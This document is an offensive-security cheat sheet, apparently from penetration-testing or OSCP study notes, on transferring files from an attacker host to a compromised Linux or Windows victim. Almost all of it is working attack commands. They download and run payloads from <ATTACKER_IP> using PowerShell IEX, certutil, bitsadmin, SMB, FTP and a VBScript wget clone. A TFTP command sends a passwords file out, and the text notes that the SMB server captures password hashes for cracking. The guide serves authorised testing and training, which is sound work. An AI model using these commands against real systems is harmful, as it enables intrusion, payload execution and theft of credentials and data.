# Transferring Files from Linux **TO** Linux

## On attacker host

Set Up a Simple Python Webserver:
```
python -m SimpleHTTPServer 4444
```

## On victim host

* Curl
* Netcat
* Ncat
* PHP (`echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>"`)
* TFTP
* FTP
* SCP

# Transferring Files from Linux **TO** Windows

## PowerShell

**On attacker host**
```
python -m SimpleHTTPServer 4444
```

**On victim host**
* Browse http://<ATTACKER_IP>:4444/EXPLOIT.EXE
* **Download** file:
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -c "(new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/EXPLOIT.EXE','C:\temp\EXPLOIT.EXE')"
```
```
powershell.exe -c "iwr -OutFile EXPLOIT.EXE -Uri http://<ATTACKER_IP>/EXPLOIT.EXE"
```
* Execute `ps1` script:
```
powershell -c "Import-Module c:\TEMP\PowerUp.ps1;Invoke-AllChecks"
```

* **Download** and **execute** a powershell script:
```
powershell "IEX(New Object Net.WebClient).downloadString('http://<ATTACKER_IP>/EXPLOIT.ps1')"
```

## FTP

**On attacker host**
```
python -m pyftpdlib -p 21
```

**On victim host**

Windows has an FTP client built in to the PATH. You can open an FTP connection and download the files directly from Kali on the command line:
```
echo open <ATTACKER_IP> 21>cmd.txt  
echo anonymous>> cmd.txt 
echo anonymous>> cmd.txt  
echo bin >> cmd.txt  
echo GET EXPLOIT.EXE >> cmd.txt  
echo bye >> cmd.txt  
```
```
ftp -v -s:cmd.txt 
```

## TFTP

It used to be installed by default in Windows XP, but now needs to be manually enabled on newer versions of Windows.

You can try to enable TFTP from the command line:
```
pkgmgr /iu:"TFTP"  
```

**On attacker host**
* With Metasploit framework
```
msfconsole
use auxiliary/server/tftp
```

* With atftpd daemon
```
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
```
(Now you can put stuff in `/srv/tftp` and it will be served)

**On victim host**
* Grab file
```
tftp -i <ATTACKER_IP> GET EXPLOIT.EXE 
```

* Exfiltrate file
```
tftp -i <ATTACKER_IP> PUT PASSWORDS.TXT
```

## SMB

**On attacker host**
```
python smbserver.py SHARE <ATTACKER_DIR>
```

:warning: If you look at the output from `smbserver.py`, you can see that every time we access the share it outputs the NetNTLMv2 hash from the current Windows user. You can feed these into John or Hashcat and crack them if you want (assuming you can't just elevate to System and get them from Mimikatz)

**On victim host**
* Connect to our shared drive
```
net use \\<ATTACKER_IP>\SHARE
```
* Get file
```
copy \\<ATTACKER_IP>\SHARE\EXPLOIT.EXE 
```

* Execute .exe
```
\\<ATTACKER_IP>\SHARE\EXPLOIT.EXE 
```

## VBScript

* Here is a good script to make a wget-clone in VB:
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

* Execute the script:
```
cscript wget.vbs http://<ATTACKER_IP>/EXPLOIT.EXE EXPLOIT.EXE
```

## Debug.exe

:warning: Works on **windows 32 bit** machines. Payload size must be lower than 64 kb!

**On attacker host**
* Compress `nc.exe`
```
upx -9 nc.exe
```

* Disassemble it
```
wine exe2bat.exe nc.exe nc.txt
```

**On victim host**

Just copy-past the text into our windows-shell. And it will automatically create a file called `nc.exe`

## CertUtil

**On victim host**
```
certutil.exe -urlcache -f http://<ATTACKER_IP>/EXPLOIT.EXE EXPLOIT.EXE
```

## bitsadmin

**On victim host**
```
bitsadmin /create 1 
bitsadmin /addfile 1 http://10.10.14.12/nc.exe c:\TEMP\nc.exe 
bitsadmin /RESUME 1 bitsadmin /complete 1
```

# References

* https://blog.ropnop.com/transferring-files-from-kali-to-windows/
* https://sushant747.gitbooks.io/total-oscp-guide/transfering_files.html
* https://0xdarkvortex.dev/index.php/2018/04/17/31-days-of-oscp-experience/